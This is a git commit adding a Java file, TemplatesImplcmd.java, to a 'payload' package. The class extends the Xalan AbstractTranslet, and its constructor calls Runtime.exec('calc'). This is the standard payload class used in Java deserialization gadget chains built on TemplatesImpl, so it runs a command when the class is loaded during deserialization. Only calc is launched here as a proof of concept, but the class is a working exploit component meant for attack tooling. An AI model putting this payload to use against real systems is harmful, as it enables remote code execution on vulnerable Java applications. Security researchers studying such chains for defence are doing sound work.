154cc380c7b8080e8af9c7966acd19a5bb1f4141
kezibei <83849145+kezibei@users.noreply.github.com>
2022-01-05 11:54:11 +0800

    Create TemplatesImplcmd.java

---
+++ src/payload/TemplatesImplcmd.java
@@ -0,0 +1,19 @@
+package payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class TemplatesImplcmd extends AbstractTranslet {
+    public TemplatesImplcmd() throws Exception {
+        Runtime.getRuntime().exec("calc");
+    }
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+    }
+    @Override
+    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
+    }
+}
